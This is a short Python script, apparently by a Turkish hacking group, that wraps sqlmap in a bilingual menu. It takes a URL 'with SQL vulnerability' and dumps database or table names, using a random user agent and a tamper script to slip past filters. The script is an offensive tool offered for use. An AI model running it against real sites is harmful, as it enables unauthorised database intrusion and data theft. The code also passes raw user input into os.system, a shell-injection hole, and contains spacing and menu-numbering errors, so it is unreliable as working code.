import os
print("""
 -> github : ka4ir <-
 -> github : hawk-unity <-

TEAM -> : WİNDOX - ALBAY - J4RELOST  - H4WK OFCX - KADİR KARATUT
--------------------------------------
1 - Enter url with SQL vulnerability (If only the database name is required, this is the right choice.)
2 - SQL açıklı url'i giriniz (Sadece veritabanı adı gerekli ise bu doğru tercih)
--------------------------------------

2 - Get The Tables (no need to write database name)
2 - Tabloları Al ( veri tabanı adı yazmaya gerek yok )
--------------------------------------
""")

vuln = input(""" Seçim yapınız(make a choice): """)

if vuln == "1":
     vulnsql = input("URL : ")
     os.system("sqlmap -u"+vulnsql+" --dbs --random-agent --tamper=space2comment ")

elif vuln == "2":
    vulnsqlk = input("URL: ")
    os.system("sqlmap -u"+vulnsqlk+"--tables --random-agent --tamper=space2comment")
